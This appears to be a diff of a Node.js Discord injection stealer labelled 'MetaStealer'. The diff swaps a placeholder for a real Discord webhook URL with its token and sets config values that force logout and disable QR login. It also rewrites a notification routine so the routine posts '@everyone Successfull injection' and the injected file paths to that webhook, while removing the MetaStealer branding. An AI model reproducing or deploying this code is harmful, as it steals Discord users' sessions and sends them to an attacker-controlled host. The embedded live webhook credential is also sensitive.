@@ -4,15 +4,15 @@ const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const webhook = "da_webhook"
+const webhook = "https://discord.com/api/webhooks/939061101230968922/0JfAW0tWNehMB1bGU0O8J_ZbZdv2-5HvtKidw01Sns_ZLZBPTzWPxb5IiyTWNaXSVh7d"
 
 const config = {
-    "logout": "%LOGOUT%1",
-    "inject-notify": "%INJECTNOTI%1",
-    "logout-notify": "%LOGOUTNOTI%1",
-    "init-notify":"%INITNOTI%1",
-    "embed-color": "%MBEDCOLOR%1",
-    "disable-qr-code": "%DISABLEQRCODE%1"
+    "logout": "instant",
+    "inject-notify": "true",
+    "logout-notify": "true",
+    "init-notify":"true",
+    "embed-color": "3447704",
+    "disable-qr-code": "true"
 }
 
 
@@ -157,7 +157,7 @@ function injectNotify() {
     var fields = [];
     injectPath.forEach( path => {
         var c = {
-            name: ":syringe: Inject Path",
+            name: "",
             value: `\`\`\`${path}\`\`\``,
             inline: !1
         }
@@ -165,17 +165,17 @@ function injectNotify() {
     })
     axios
 	.post(webhook, {
-        "content": null,
+        "content": "@everyone 🕵️ Successfull injection",
         "embeds": [
           {
-            "title": ":detective: Successfull injection",
+            "title": "",
             "color": config["embed-color"],
             "fields": fields,
             "author": {
-              "name": "MetaStealer"
+              "name": ""
             },
             "footer": {
-              "text": "MetaStealer"
+              "text": ""
             }
           }
         ]
@@ -187,4 +187,3 @@ function injectNotify() {
     })
 
 }
-
